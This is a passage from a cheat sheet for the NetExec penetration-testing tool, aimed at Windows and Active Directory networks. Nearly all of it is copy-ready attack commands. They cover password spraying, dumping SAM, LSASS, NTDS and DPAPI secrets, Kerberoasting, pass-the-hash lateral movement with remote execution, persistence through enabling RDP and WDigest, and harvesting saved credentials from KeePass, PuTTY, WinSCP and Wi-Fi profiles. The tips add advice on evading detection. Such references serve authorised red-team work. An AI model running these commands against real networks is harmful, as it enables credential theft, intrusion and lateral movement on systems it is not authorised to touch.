nxc smb 192.168.1.0/24
nxc rdp 192.168.1.0/24 -u '' -p ''
nxc winrm 192.168.1.0/24 -u '' -p ''
```

### 2. Password Spraying
```bash
# Single password spray (safe)
nxc smb targets.txt -u users.txt -p 'Winter2024!' -d DOMAIN --continue-on-success

# With fail limits
nxc smb targets.txt -u users.txt -p passwords.txt --ufail-limit 3 --fail-limit 5

# Check valid creds across multiple protocols
nxc smb 192.168.1.10 -u admin -p pass
nxc winrm 192.168.1.10 -u admin -p pass
nxc mssql 192.168.1.10 -u admin -p pass
nxc rdp 192.168.1.10 -u admin -p pass
```

### 3. Credential Dumping
```bash
# Local SAM
nxc smb 192.168.1.10 -u admin -p pass --sam

# LSASS memory
nxc smb 192.168.1.10 -u admin -p pass -M lsassy
nxc smb 192.168.1.10 -u admin -p pass -M nanodump

# Domain Controller NTDS
nxc smb dc01.domain.local -u admin -p pass --ntds
nxc smb dc01.domain.local -u admin -p pass --ntds --enabled

# DPAPI
nxc smb 192.168.1.10 -u admin -p pass --dpapi cookies
```

### 4. Domain Enumeration
```bash
# Users and groups
nxc ldap dc01.domain.local -u user -p pass --users --groups

# Kerberoastable accounts
nxc ldap dc01.domain.local -u user -p pass --kerberoasting kerberoast.txt

# ASREProastable accounts
nxc ldap dc01.domain.local -u user -p pass --asreproast asrep.txt

# Bloodhound data
nxc ldap dc01.domain.local -u user -p pass --bloodhound -c All

# Find vulnerabilities
nxc ldap dc01.domain.local -u user -p pass -M adcs
nxc ldap dc01.domain.local -u user -p pass -M laps
```

### 5. Lateral Movement
```bash
# Pass-the-Hash
nxc smb targets.txt -u admin -H <NTLM> -x "hostname"

# Execute on multiple targets
nxc smb targets.txt -u admin -p pass -x "whoami"
nxc winrm targets.txt -u admin -p pass -x "ipconfig"

# Spray hashes
nxc smb targets.txt -u users.txt -H hashes.txt --continue-on-success
```

### 6. Post-Exploitation
```bash
# Persistence
nxc smb 192.168.1.10 -u admin -p pass -M rdp -o ACTION=enable
nxc smb 192.168.1.10 -u admin -p pass -M wdigest -o ACTION=enable

# Credential hunting
nxc smb 192.168.1.10 -u admin -p pass -M spider_plus
nxc smb 192.168.1.10 -u admin -p pass -M gpp_password
nxc smb 192.168.1.10 -u admin -p pass -M keepass_discover

# Application credentials
nxc smb 192.168.1.10 -u admin -p pass -M putty
nxc smb 192.168.1.10 -u admin -p pass -M winscp
nxc smb 192.168.1.10 -u admin -p pass -M wifi
```

---

## Tips & Best Practices

- Use `--continue-on-success` for password spraying to find all valid credentials
- Use `--no-bruteforce` to stop after first valid credential per host (avoid lockouts)
- Add `--jitter` to introduce random delays and avoid detection
- Use `--ufail-limit` and `--fail-limit` to prevent account lockouts
- Check SMB signing with basic scan before relay attacks
- Use LDAP for domain enumeration (less noisy than SMB)
- Pass-the-Hash only needs NTLM hash (not LM)
- Always specify `-d DOMAIN` or `--local-auth` explicitly
- Use `cmedb` to review all findings in the database
- Module options: `-M module_name -o OPTION=value`
- Rate limit yourself to avoid account lockouts and detection
- Use `--no-progress` when logging output to files
- Test authentication across multiple protocols (SMB, WinRM, RDP, MSSQL)

---

## Resources

- **GitHub**: https://github.com/Pennyw0rth/NetExec
- **Wiki**: https://www.netexec.wiki/
- **Modules**: https://www.netexec.wiki/getting-started/using-modules
